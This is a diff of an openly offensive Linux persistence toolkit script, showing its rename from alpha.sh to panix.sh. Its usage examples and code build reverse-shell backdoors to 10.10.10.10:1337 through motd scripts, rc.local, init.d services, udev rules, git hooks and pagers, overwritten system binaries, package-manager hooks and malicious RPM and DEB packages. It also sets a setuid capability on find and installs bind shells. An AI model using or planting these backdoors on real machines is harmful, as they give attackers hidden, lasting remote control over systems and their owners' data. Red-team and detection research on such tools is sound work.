-				echo "sudo ./alpha.sh --motd --default --ip 10.10.10.10 --port 1337"
+				echo "sudo ./panix.sh --motd --default --ip 10.10.10.10 --port 1337"
 				echo ""
 				echo "--custom:"
-				echo "sudo ./alpha.sh --motd --custom --command \"nohup setsid bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' & disown\" --path \"/etc/update-motd.d/137-python-upgrades\""
+				echo "sudo ./panix.sh --motd --custom --command \"nohup setsid bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' & disown\" --path \"/etc/update-motd.d/137-python-upgrades\""
 				exit 0
 				;;
 			--help|-h)
@@ -1615,7 +1617,7 @@ setup_motd_backdoor() {
 				;;
 			* )
 				echo "Invalid option for --motd-backdoor: $1"
-				echo "Try './alpha.sh --motd --help' for more information."
+				echo "Try './panix.sh --motd --help' for more information."
 				exit 1
 		esac
 		shift
@@ -1623,20 +1625,20 @@ setup_motd_backdoor() {
 
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
-		echo "Try './alpha.sh --motd --help' for more information."
+		echo "Try './panix.sh --motd --help' for more information."
 		exit 1
 	fi
 
 	if [[ $default -eq 0 && $custom -eq 0 ]]; then
 		echo "Error: Either --default or --custom must be specified."
-		echo "Try './alpha.sh --motd --help' for more information."
+		echo "Try './panix.sh --motd --help' for more information."
 		exit 1
 	fi
 
 	if [[ $default -eq 1 ]]; then
 		if [[ -z $ip || -z $port ]]; then
 			echo "Error: --ip and --port must be specified when using --default."
-			echo "Try './alpha.sh --motd --help' for more information."
+			echo "Try './panix.sh --motd --help' for more information."
 			exit 1
 		fi
 		mkdir -p /etc/update-motd.d
@@ -1648,7 +1650,7 @@ setup_motd_backdoor() {
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $command || -z $path ]]; then
 			echo "Error: --command and --path must be specified when using --custom."
-			echo "Try './alpha.sh --motd --help' for more information."
+			echo "Try './panix.sh --motd --help' for more information."
 			exit 1
 		fi
 
@@ -1680,7 +1682,7 @@ setup_rc_local_backdoor() {
 	fi
 
 	usage_rc_local_backdoor() {
-		echo "Usage: ./alpha.sh --rc-local [OPTIONS]"
+		echo "Usage: ./panix.sh --rc-local [OPTIONS]"
 		echo "--examples                   Display command examples"
 		echo "--default                    Use default rc.local settings"
 		echo "  --ip <ip>                    Specify IP address"
@@ -1712,10 +1714,10 @@ setup_rc_local_backdoor() {
 			--examples )
 				echo "Examples:"
 				echo "--default:"
-				echo "sudo ./alpha.sh --rc-local --default --ip 10.10.10.10 --port 1337"
+				echo "sudo ./panix.sh --rc-local --default --ip 10.10.10.10 --port 1337"
 				echo ""
 				echo "--custom:"
-				echo "sudo ./alpha.sh --rc-local --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\""
+				echo "sudo ./panix.sh --rc-local --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\""
 				exit 0
 				;;
 			--help|-h)
@@ -1724,7 +1726,7 @@ setup_rc_local_backdoor() {
 				;;
 			* )
 				echo "Invalid option for --rc-local-backdoor: $1"
-				echo "Try './alpha.sh --rc-local --help' for more information."
+				echo "Try './panix.sh --rc-local --help' for more information."
 				exit 1
 		esac
 		shift
@@ -1732,20 +1734,20 @@ setup_rc_local_backdoor() {
 
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
-		echo "Try './alpha.sh --rc-local --help' for more information."
+		echo "Try './panix.sh --rc-local --help' for more information."
 		exit 1
 	fi
 
 	if [[ $default -eq 0 && $custom -eq 0 ]]; then
 		echo "Error: Either --default or --custom must be specified."
-		echo "Try './alpha.sh --rc-local --help' for more information."
+		echo "Try './panix.sh --rc-local --help' for more information."
 		exit 1
 	fi
 
 	if [[ $default -eq 1 ]]; then
 		if [[ -z $ip || -z $port ]]; then
 			echo "Error: --ip and --port must be specified when using --default."
-			echo "Try './alpha.sh --rc-local --help' for more information."
+			echo "Try './panix.sh --rc-local --help' for more information."
 			exit 1
 		fi
 
@@ -1760,7 +1762,7 @@ setup_rc_local_backdoor() {
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $command ]]; then
 			echo "Error: --command must be specified when using --custom."
-			echo "Try './alpha.sh --rc-local --help' for more information."
+			echo "Try './panix.sh --rc-local --help' for more information."
 			exit 1
 		fi
 
@@ -1792,7 +1794,7 @@ setup_initd_backdoor() {
 	fi
 
 	usage_initd_backdoor() {
-		echo "Usage: ./alpha.sh --initd-backdoor [OPTIONS]"
+		echo "Usage: ./panix.sh --initd-backdoor [OPTIONS]"
 		echo "--examples                   Display command examples"
 		echo "--default                    Use default init.d settings"
 		echo "  --ip <ip>                    Specify IP address"
@@ -1829,10 +1831,10 @@ setup_initd_backdoor() {
 			--examples )
 				echo "Examples:"
 				echo "--default:"
-				echo "sudo ./alpha.sh --initd --default --ip 10.10.10.10 --port 1337"
+				echo "sudo ./panix.sh --initd --default --ip 10.10.10.10 --port 1337"
 				echo ""
 				echo "--custom:"
-				echo "sudo ./alpha.sh --initd --custom --command \"nohup setsid bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --path \"/etc/init.d/initd-backdoor\""
+				echo "sudo ./panix.sh --initd --custom --command \"nohup setsid bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --path \"/etc/init.d/initd-backdoor\""
 				exit 0
 				;;
 			--help|-h)
@@ -1841,7 +1843,7 @@ setup_initd_backdoor() {
 				;;
 			* )
 				echo "Invalid option for --initd: $1"
-				echo "Try './alpha.sh --initd --help' for more information."
+				echo "Try './panix.sh --initd --help' for more information."
 				exit 1
 		esac
 		shift
@@ -1849,13 +1851,13 @@ setup_initd_backdoor() {
 
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
-		echo "Try './alpha.sh --initd --help' for more information."
+		echo "Try './panix.sh --initd --help' for more information."
 		exit 1
 	fi
 
 	if [[ $default -eq 0 && $custom -eq 0 ]]; then
 		echo "Error: Either --default or --custom must be specified."
-		echo "Try './alpha.sh --initd --help' for more information."
+		echo "Try './panix.sh --initd --help' for more information."
 		exit 1
 	fi
 
@@ -1921,7 +1923,7 @@ setup_initd_backdoor() {
 	if [[ $default -eq 1 ]]; then
 		if [[ -z $ip || -z $port ]]; then
 			echo "Error: --ip and --port must be specified when using --default."
-			echo "Try './alpha.sh --initd --help' for more information."
+			echo "Try './panix.sh --initd --help' for more information."
 			exit 1
 		fi
 
@@ -1937,7 +1939,7 @@ setup_initd_backdoor() {
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $command || -z $initd_path ]]; then
 			echo "Error: --command and --path must be specified when using --custom."
-			echo "Try './alpha.sh --initd --help' for more information."
+			echo "Try './panix.sh --initd --help' for more information."
 			exit 1
 		fi
 
@@ -1962,7 +1964,7 @@ setup_package_manager_persistence() {
 	fi
 
 	usage_package_manager_persistence() {
-		echo "Usage: ./alpha.sh --package-manager [OPTIONS]"
+		echo "Usage: ./panix.sh --package-manager [OPTIONS]"
 		echo "--examples                   Display command examples"
 		echo "--ip <ip>                    Specify IP address"
 		echo "--port <port>                Specify port number"
@@ -1984,7 +1986,7 @@ setup_package_manager_persistence() {
 				;;
 			--examples )
 				echo "Example:"
-				echo "sudo ./alpha.sh --package-manager --ip 10.10.10.10 --port 1337 --apt | --yum | --dnf"
+				echo "sudo ./panix.sh --package-manager --ip 10.10.10.10 --port 1337 --apt | --yum | --dnf"
 				exit 0
 				;;
 			--help|-h)
@@ -1993,7 +1995,7 @@ setup_package_manager_persistence() {
 				;;
 			* )
 				echo "Invalid option: $1"
-				echo "Try './alpha.sh --package-manager --help' for more information."
+				echo "Try './panix.sh --package-manager --help' for more information."
 				exit 1
 		esac
 		shift
@@ -2001,7 +2003,7 @@ setup_package_manager_persistence() {
 
 	if [[ -z $ip || -z $port || -z $mechanism ]]; then
 		echo "Error: --ip, --port, and one of --apt, --yum, or --dnf must be specified."
-		echo "Try './alpha.sh --package-manager --help' for more information."
+		echo "Try './panix.sh --package-manager --help' for more information."
 		exit 1
 	fi
 	# If anyone finds a way for EOF to work with indentation in both an editor and on the host, LMK lol.
@@ -2011,7 +2013,7 @@ setup_package_manager_persistence() {
 		--apt )
 			if [[ ! -x "$(command -v apt)" ]]; then
 				echo "APT is not installed. Please install APT to use this option."
-				echo "Try './alpha.sh --package-manager --help' for more information."
+				echo "Try './panix.sh --package-manager --help' for more information."
 				exit 1
 			fi
 
@@ -2023,13 +2025,13 @@ setup_package_manager_persistence() {
 		--yum )
 			if [[ ! -x "$(command -v yum)" ]]; then
 				echo "Yum is not installed. Please install Yum to use this option."
-				echo "Try './alpha.sh --package-manager --help' for more information."
+				echo "Try './panix.sh --package-manager --help' for more information."
 				exit 1
 			fi
 
 			if [[ -x "$(command -v dnf)" && "$(readlink -f "$(which yum)")" == "$(which dnf)" ]]; then
 				echo "Yum is symlinked to DNF. Please use --dnf option."
-				echo "Try './alpha.sh --package-manager --help' for more information."
+				echo "Try './panix.sh --package-manager --help' for more information."
 				exit 1
 			fi
 
@@ -2047,7 +2049,7 @@ setup_package_manager_persistence() {
 		--dnf )
 			if [[ ! -x "$(command -v dnf)" ]]; then
 				echo "DNF is not installed. Please install DNF to use this option."
-				echo "Try './alpha.sh --package-manager --help' for more information."
+				echo "Try './panix.sh --package-manager --help' for more information."
 				exit 1
 			fi
 
@@ -2081,7 +2083,7 @@ setup_cap_backdoor() {
 	fi
 
 	usage_cap_backdoor() {
-		echo "Usage: ./alpha.sh --cap [OPTIONS]"
+		echo "Usage: ./panix.sh --cap [OPTIONS]"
 		echo "--examples                   Display command examples"
 		echo "--default                    Use default capabilities settings"
 		echo "--custom                     Use custom capabilities settings"
@@ -2108,10 +2110,10 @@ setup_cap_backdoor() {
 			--examples )
 				echo "Examples:"
 				echo "--default:"
-				echo "sudo ./alpha.sh --cap --default"
+				echo "sudo ./panix.sh --cap --default"
 				echo ""
 				echo "--custom:"
-				echo "sudo ./alpha.sh --cap --custom --capability \"cap_setuid+ep\" --binary \"/bin/find\""
+				echo "sudo ./panix.sh --cap --custom --capability \"cap_setuid+ep\" --binary \"/bin/find\""
 				exit 0
 				;;
 			--help|-h)
@@ -2120,7 +2122,7 @@ setup_cap_backdoor() {
 				;;
 			* )
 				echo "Invalid option for --cap: $1"
-				echo "Try './alpha.sh --cap --help' for more information."
+				echo "Try './panix.sh --cap --help' for more information."
 				exit 1
 		esac
 		shift
@@ -2128,13 +2130,13 @@ setup_cap_backdoor() {
 
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
-		echo "Try './alpha.sh --cap --help' for more information."
+		echo "Try './panix.sh --cap --help' for more information."
 		exit 1
 	fi
 
 	if [[ $default -eq 0 && $custom -eq 0 ]]; then
 		echo "Error: Either --default or --custom must be specified."
-		echo "Try './alpha.sh --cap --help' for more information."
+		echo "Try './panix.sh --cap --help' for more information."
 		exit 1
 	fi
 
@@ -2158,7 +2160,7 @@ setup_cap_backdoor() {
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $capability || -z $binary ]]; then
 			echo "Error: --capability and --binary must be specified with --custom."
-			echo "Try './alpha.sh --cap --help' for more information."
+			echo "Try './panix.sh --cap --help' for more information."
 			exit 1
 		fi
 
@@ -2186,7 +2188,7 @@ setup_bind_shell() {
 	local binary=""
 
 	usage_bind_shell() {
-		echo "Usage: ./alpha.sh --bind-shell [OPTIONS]"
+		echo "Usage: ./panix.sh --bind-shell [OPTIONS]"
 		echo "--examples                   Display command examples"
 		echo "--default                    Use default bind shell settings"
 		echo "  --architecture <arch>        Specify architecture (x86 or x64)"
@@ -2213,10 +2215,10 @@ setup_bind_shell() {
 			--examples )
 				echo "Examples:"
 				echo "--default:"
-				echo "sudo ./alpha.sh --bind-shell --default --architecture x86"
+				echo "sudo ./panix.sh --bind-shell --default --architecture x86"
 				echo ""
 				echo "--custom:"
-				echo "sudo ./alpha.sh --bind-shell --custom --binary \"/tmp/bindshell\""
+				echo "sudo ./panix.sh --bind-shell --custom --binary \"/tmp/bindshell\""
 				exit 0
 				;;
 			--help|-h)
@@ -2225,7 +2227,7 @@ setup_bind_shell() {
 				;;
 			* )
 				echo "Invalid option for --bind-shell: $1"
-				echo "Try './alpha.sh --bind-shell --help' for more information."
+				echo "Try './panix.sh --bind-shell --help' for more information."
 				exit 1
 		esac
 		shift
@@ -2233,14 +2235,14 @@ setup_bind_shell() {
 
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
-		echo "Try './alpha.sh --bind-shell --help' for more information."
+		echo "Try './panix.sh --bind-shell --help' for more information."
 		exit 1
 	fi
 
 	if [[ $default -eq 1 ]]; then
 		if [[ -z $architecture ]]; then
 			echo "Error: --architecture (x64/x86) must be specified when using --default."
-			echo "Try './alpha.sh --bind-shell --help' for more information."
+			echo "Try './panix.sh --bind-shell --help' for more information."
 			exit 1
 		fi
 
@@ -2259,7 +2261,7 @@ setup_bind_shell() {
 				;;
 			* )
 				echo "Error: Invalid architecture specified. Use one of x86 or x64"
-				echo "Try './alpha.sh --bind-shell --help' for more information."
+				echo "Try './panix.sh --bind-shell --help' for more information."
 				exit 1
 		esac
 
@@ -2269,13 +2271,13 @@ setup_bind_shell() {
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $binary ]]; then
 			echo "Error: --binary must be specified when using --custom."
-			echo "Try './alpha.sh --bind-shell --help' for more information."
+			echo "Try './panix.sh --bind-shell --help' for more information."
 			exit 1
 		fi
 
 		if [[ ! -f $binary ]]; then
 			echo "Error: Specified binary does not exist: $binary"
-			echo "Try './alpha.sh --bind-shell --help' for more information."
+			echo "Try './panix.sh --bind-shell --help' for more information."
 			exit 1
 		fi
 
@@ -2285,7 +2287,7 @@ setup_bind_shell() {
 
 	else
 		echo "Error: Either --default or --custom must be specified for --bind-shell."
-		echo "Try './alpha.sh --bind-shell --help' for more information."
+		echo "Try './panix.sh --bind-shell --help' for more information."
 		exit 1
 	fi
 	echo "[+] Bind shell persistence established!"
@@ -2306,7 +2308,7 @@ setup_system_binary_backdoor() {
 	fi
 
 	usage_system_binary_backdoor() {
-		echo "Usage: ./alpha.sh --system-binary [OPTIONS]"
+		echo "Usage: ./panix.sh --system-binary [OPTIONS]"
 		echo "--examples                   Display command examples"
 		echo "--default                    Use default system binary backdoor settings"
 		echo "  --ip <ip>                    Specify IP address"
@@ -2347,10 +2349,10 @@ setup_system_binary_backdoor() {
 			--examples )
 				echo "Examples:"
 				echo "--default:"
-				echo "sudo ./alpha.sh --system-binary --default --ip 10.10.10.10 --port 1337"
+				echo "sudo ./panix.sh --system-binary --default --ip 10.10.10.10 --port 1337"
 				echo ""
 				echo "--custom:"
-				echo "sudo ./alpha.sh --system-binary --custom --binary \"/bin/cat\" --command \"/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337'\" --warning"
+				echo "sudo ./panix.sh --system-binary --custom --binary \"/bin/cat\" --command \"/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337'\" --warning"
 				exit 0
 				;;
 			--help|-h)
@@ -2359,7 +2361,7 @@ setup_system_binary_backdoor() {
 				;;
 			* )
 				echo "Invalid option for --system-binary-backdoor: $1"
-				echo "Try './alpha.sh --system-binary --help' for more information."
+				echo "Try './panix.sh --system-binary --help' for more information."
 				exit 1
 		esac
 		shift
@@ -2367,20 +2369,20 @@ setup_system_binary_backdoor() {
 
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
-		echo "Try './alpha.sh --system-binary --help' for more information."
+		echo "Try './panix.sh --system-binary --help' for more information."
 		exit 1
 	fi
 
 	if [[ $default -eq 0 && $custom -eq 0 ]]; then
 		echo "Error: Either --default or --custom must be specified."
-		echo "Try './alpha.sh --system-binary --help' for more information."
+		echo "Try './panix.sh --system-binary --help' for more information."
 		exit 1
 	fi
 
 	if [[ $default -eq 1 ]]; then
 		if [[ -z $ip || -z $port ]]; then
 			echo "Error: --ip and --port must be specified when using --default."
-			echo "Try './alpha.sh --system-binary --help' for more information."
+			echo "Try './panix.sh --system-binary --help' for more information."
 			exit 1
 		fi
 
@@ -2401,7 +2403,7 @@ setup_system_binary_backdoor() {
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $binary || -z $command ]]; then
 			echo "Error: --binary and --command must be specified when using --custom."
-			echo "Try './alpha.sh --system-binary --help' for more information."
+			echo "Try './panix.sh --system-binary --help' for more information."
 			exit 1
 		fi
 
@@ -2409,7 +2411,7 @@ setup_system_binary_backdoor() {
 			echo "Error: --warning must be specified when using --custom."
 			echo "Warning: this will overwrite the original binary with the backdoored version."
 			echo "You better know what you are doing with that custom command!"
-			echo "Try './alpha.sh --system-binary --help' for more information."
+			echo "Try './panix.sh --system-binary --help' for more information."
 			exit 1
 		fi
 
@@ -2440,7 +2442,7 @@ setup_udev() {
 	fi
 
 	usage_udev() {
-		echo "Usage: ./alpha.sh --udev [OPTIONS]"
+		echo "Usage: ./panix.sh --udev [OPTIONS]"
 		echo "--examples                   Display command examples"
 		echo "--default                    Use default udev settings"
 		echo "  --ip <ip>                    Specify IP address"
@@ -2481,10 +2483,10 @@ setup_udev() {
 			--examples )
 				echo "Examples:"
 				echo "--default:"
-				echo "sudo ./alpha.sh --udev --default --ip 10.10.10.10 --port 1337 --at|--cron|--systemd"
+				echo "sudo ./panix.sh --udev --default --ip 10.10.10.10 --port 1337 --at|--cron|--systemd"
 				echo ""
 				echo "--custom:"
-				echo "sudo ./alpha.sh --udev --custom --command 'SUBSYSTEM==\"net\", KERNEL!=\"lo\", RUN+=\"/usr/bin/at -M -f /tmp/payload now\"' --path \"/etc/udev/rules.d/10-backdoor.rules\""
+				echo "sudo ./panix.sh --udev --custom --command 'SUBSYSTEM==\"net\", KERNEL!=\"lo\", RUN+=\"/usr/bin/at -M -f /tmp/payload now\"' --path \"/etc/udev/rules.d/10-backdoor.rules\""
 				echo "echo -e '#!/bin/sh\nnohup setsid bash -c \"bash -i >& /dev/tcp/10.10.10.10/1337 0>&1\" &' > /tmp/payload && chmod +x /tmp/payload && udevadm control --reload"
 				exit 0
 				;;
@@ -2494,7 +2496,7 @@ setup_udev() {
 				;;
 			* )
 				echo "Invalid option: $1"
-				echo "Try './alpha.sh --udev --help' for more information."
+				echo "Try './panix.sh --udev --help' for more information."
 				exit 1
 		esac
 		shift
@@ -2503,12 +2505,12 @@ setup_udev() {
 	if [[ $default -eq 1 ]]; then
 		if [[ -z $ip || -z $port ]]; then
 			echo "Error: --default requires --ip and --port."
-			echo "Try './alpha.sh --udev --help' for more information."
+			echo "Try './panix.sh --udev --help' for more information."
 			exit 1
 		fi
 		if [[ -z $mechanism ]]; then
 			echo "Error: --default requires --at, --cron, or --systemd."
-			echo "Try './alpha.sh --udev --help' for more information."
+			echo "Try './panix.sh --udev --help' for more information."
 			exit 1
 		fi
 
@@ -2577,7 +2579,7 @@ setup_udev() {
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $command || -z $path ]]; then
 			echo "Error: --custom requires --command and --path."
-			echo "Try './alpha.sh --udev --help' for more information."
+			echo "Try './panix.sh --udev --help' for more information."
 			exit 1
 		fi
 
@@ -2586,7 +2588,7 @@ setup_udev() {
 
 	else
 		echo "Error: Either --default or --custom must be specified for --udev."
-		echo "Try './alpha.sh --udev --help' for more information."
+		echo "Try './panix.sh --udev --help' for more information."
 		exit 1
 	fi
 
@@ -2607,7 +2609,7 @@ setup_git_persistence() {
 	local command=""
 
 	usage_git() {
-		echo "Usage: ./alpha.sh --git [OPTIONS]"
+		echo "Usage: ./panix.sh --git [OPTIONS]"
 		echo "--examples                   Display command examples"
 		echo "--default                    Use default bind shell settings"
 		echo "  --ip <ip>                    Specify IP address"
@@ -2654,12 +2656,12 @@ setup_git_persistence() {
 			--examples )
 				echo "Examples:"
 				echo "--default:"
-				echo "./alpha.sh --git --default --ip 10.10.10.10 --port 1337 --hook|--pager"
+				echo "./panix.sh --git --default --ip 10.10.10.10 --port 1337 --hook|--pager"
 				echo ""
 				echo "--custom:"
-				echo "./alpha.sh --git --custom --command \"(nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' > /dev/null 2>&1 &) &\" --path \"gitdir/.git/hooks/pre-commit\" --hook"
+				echo "./panix.sh --git --custom --command \"(nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' > /dev/null 2>&1 &) &\" --path \"gitdir/.git/hooks/pre-commit\" --hook"
 				echo ""
-				echo "./alpha.sh --git --custom --command \"nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' > /dev/null 2>&1 & \${PAGER:-less}\" --path \"~/.gitconfig --pager\""
+				echo "./panix.sh --git --custom --command \"nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' > /dev/null 2>&1 & \${PAGER:-less}\" --path \"~/.gitconfig --pager\""
 				exit 0
 				;;
 			--help|-h)
@@ -2668,7 +2670,7 @@ setup_git_persistence() {
 				;;
 			* )
 				echo "Invalid option for --git: $1"
-				echo "Try './alpha.sh --git --help' for more information."
+				echo "Try './panix.sh --git --help' for more information."
 				exit 1
 		esac
 		shift
@@ -2676,20 +2678,20 @@ setup_git_persistence() {
 
 	if [[ $default -eq 0 && $custom -eq 0 ]]; then
 		echo "Error: --default or --custom must be specified."
-		echo "Try './alpha.sh --git --help' for more information."
+		echo "Try './panix.sh --git --help' for more information."
 		exit 1
 	fi
 
 	if [[ $default -eq 1 ]]; then
 		if [[ -z $ip || -z $port ]]; then
 			echo "Error: --ip and --port must be specified when using --default."
-			echo "Try './alpha.sh --git --help' for more information."
+			echo "Try './panix.sh --git --help' for more information."
 			exit 1
 		fi
 
 		if [[ $hook -eq 0 && $pager -eq 0 ]]; then
 			echo "Error: Either --hook or --pager must be specified with --default."
-			echo "Try './alpha.sh --git --help' for more information."
+			echo "Try './panix.sh --git --help' for more information."
 			exit 1
 		fi
 	fi
@@ -2697,13 +2699,13 @@ setup_git_persistence() {
 	if [[ $custom -eq 1 ]]; then
 		if [[ -z $path || -z $command ]]; then
 			echo "Error: --path and --command must be specified when using --custom."
-			echo "Try './alpha.sh --git --help' for more information."
+			echo "Try './panix.sh --git --help' for more information."
 			exit 1
 		fi
 
 		if [[ $hook -eq 0 && $pager -eq 0 ]]; then
 			echo "Error: Either --hook or --pager must be specified with --custom."
-			echo "Try './alpha.sh --git --help' for more information."
+			echo "Try './panix.sh --git --help' for more information."
 			exit 1
 		fi
 	fi
@@ -2835,7 +2837,7 @@ setup_malicious_docker_container() {
 	fi
 
 	usage_malicious_docker_container() {
-		echo "Usage: ./alpha.sh --docker-container [OPTIONS]"
+		echo "Usage: ./panix.sh --docker-container [OPTIONS]"
 		echo "--examples                   Display command examples"
 		echo "--ip <ip>                    Specify IP address"
 		echo "--port <port>                Specify port number"
@@ -2857,12 +2859,12 @@ setup_malicious_docker_container() {
 				;;
 			--examples )
 				echo "Examples:"
-				echo "./alpha.sh --docker-container --default --ip 10.10.10.10 --port 1337"
+				echo "./panix.sh --docker-container --default --ip 10.10.10.10 --port 1337"
 				exit 0
 				;;
 			* )
 				echo "Invalid option for --docker-container: $1"
-				echo "Try './alpha.sh --docker-container --help' for more information."
+				echo "Try './panix.sh --docker-container --help' for more information."
 				exit 1
 		esac
 		shift
@@ -2870,7 +2872,7 @@ setup_malicious_docker_container() {
 
 	if [[ -z $ip || -z $port ]]; then
 		echo "Error: --ip and --port must be specified."
-		echo "Try './alpha.sh --docker-container --help' for more information."
+		echo "Try './panix.sh --docker-container --help' for more information."
 		exit 1
 	fi
 
@@ -2951,7 +2953,7 @@ setup_malicious_package() {
 				;;
 			--examples )
 				echo "Example:"
-				echo "sudo ./alpha.sh --malicious-package --ip 10.10.10.10 --port 1337 --rpm | --dpkg"
+				echo "sudo ./panix.sh --malicious-package --ip 10.10.10.10 --port 1337 --rpm | --dpkg"
 				exit 0
 				;;
 			--help | -h )
@@ -2992,7 +2994,7 @@ setup_malicious_package() {
 			mkdir -p ~/rpmbuild/SRPMS
 
 			# RPM package setup
-			PACKAGE_NAME="alpha"
+			PACKAGE_NAME="panix"
 			PACKAGE_VERSION="1.0"
 			cat <<-EOF > ~/rpmbuild/SPECS/${PACKAGE_NAME}.spec
 			Name: ${PACKAGE_NAME}
@@ -3044,7 +3046,7 @@ setup_malicious_package() {
 			fi
 
 			# DPKG package setup
-			PACKAGE_NAME="alpha"
+			PACKAGE_NAME="panix"
 			PACKAGE_VERSION="1.0"
 			DEB_DIR="${PACKAGE_NAME}/DEBIAN"
 			PAYLOAD="#!/bin/sh\nnohup setsid bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' &"
@@ -3060,8 +3062,8 @@ setup_malicious_package() {
 			echo "Package: ${PACKAGE_NAME}" > ${DEB_DIR}/control
 			echo "Version: ${PACKAGE_VERSION}" >> ${DEB_DIR}/control
 			echo "Architecture: all" >> ${DEB_DIR}/control
-			echo "Maintainer: https://github.com/Aegrah/ALPHA" >> ${DEB_DIR}/control
-			echo "Description: This malicious package was added through ALPHA" >> ${DEB_DIR}/control
+			echo "Maintainer: https://github.com/Aegrah/PANIX" >> ${DEB_DIR}/control
+			echo "Description: This malicious package was added through PANIX" >> ${DEB_DIR}/control
 
 			# Build the .deb package
 			dpkg-deb --build ${PACKAGE_NAME}
@@ -3340,10 +3342,10 @@ revert_changes() {
 	# Malicious package
 	echo "[*] Cleaning Malicious package persistence methods..."
 	if $is_root; then
-		rm -f /var/lib/rpm/alpha.rpm
-		rm -f /var/lib/dpkg/info/alpha.postinst
-		sed -i '/alpha.rpm/ d' /var/spool/cron/$current_user
-		sed -i '/alpha.postinst/ d' /var/spool/cron/crontabs/$current_user
+		rm -f /var/lib/rpm/panix.rpm
+		rm -f /var/lib/dpkg/info/panix.postinst
+		sed -i '/panix.rpm/ d' /var/spool/cron/$current_user
+		sed -i '/panix.postinst/ d' /var/spool/cron/crontabs/$current_user
 	fi
 	echo "[+] Successfully cleaned persistence method Malicious package"
 }
